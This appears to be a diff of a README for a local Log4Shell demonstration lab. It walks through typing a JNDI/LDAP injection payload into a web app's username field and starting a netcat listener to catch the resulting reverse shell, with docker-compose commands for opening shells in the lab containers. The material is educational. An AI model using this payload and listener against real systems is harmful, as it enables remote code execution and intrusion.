@@ -9,10 +9,18 @@ Go go localhost:8000 and fill into username:
 
 
 Go back and fill another time:
-```${jndi:ldap://remote-code-execution:1389/a}```
+```${jndi:ldap://reverse-shell:1389/a}```
 
 
 Start terminal in Ubuntu:
-```docker exec -it log4shell-equinor-ubuntu-1 bash```
+```
+docker-compose up -d ubuntu
+docker-compose exec ubuntu bash
+```
+
+Start terminal in web-server:
+```docker-compose exec web-server bash```
+
 Listen for reverse shell:
-```nc -lvnp 9001```
+```nc -lv 9001```
+
